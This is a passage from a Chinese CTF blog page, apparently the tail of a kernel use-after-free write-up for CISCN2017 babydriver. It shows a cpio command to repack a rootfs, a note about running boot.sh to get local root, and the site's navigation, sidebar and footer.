+<p>之后将其放入core/tmp文件中，重新打包 rootfs.cpio</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">find . | cpio -o --format&#x3D;newc &gt; .&#x2F;..&#x2F;rootfs.cpio<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>之后运行boot.sh实现本地提权</p>
+<p><img src="https://pic.imgdb.cn/item/621debe92ab3f51d916ada21.png"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
+              <a href="/tags/kernel/" rel="tag"># kernel</a>
+              <a href="/tags/UAF/" rel="tag"># UAF</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/post/pwn-%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8Bkernel-pwn.html" rel="prev" title="pwn-从零开始kernel pwn">
+      <i class="fa fa-chevron-left"></i> pwn-从零开始kernel pwn
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#kernel-UAF%EF%BC%88%E4%B8%80%EF%BC%89"><span class="nav-number">1.</span> <span class="nav-text">kernel UAF（一）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN2017-babydriver"><span class="nav-number">1.1.</span> <span class="nav-text">CISCN2017 - babydriver</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">1.1.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF"><span class="nav-number">1.1.2.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">1.1.3.</span> <span class="nav-text">exp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#get-root-shell"><span class="nav-number">1.1.4.</span> <span class="nav-text">get root shell</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Mark0519"
+      src="https://pic.imgdb.cn/item/5fbd287eb18d627113535cf8.png">
+  <p class="site-author-name" itemprop="name">Mark0519</p>
+  <div class="site-description" itemprop="description">菜鸡CTFer的自留地</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">68</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">24</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/mark0519" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;mark0519" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:sunjiajun@bupt.edu.cn" title="E-Mail → mailto:sunjiajun@bupt.edu.cn" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Mark0519</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
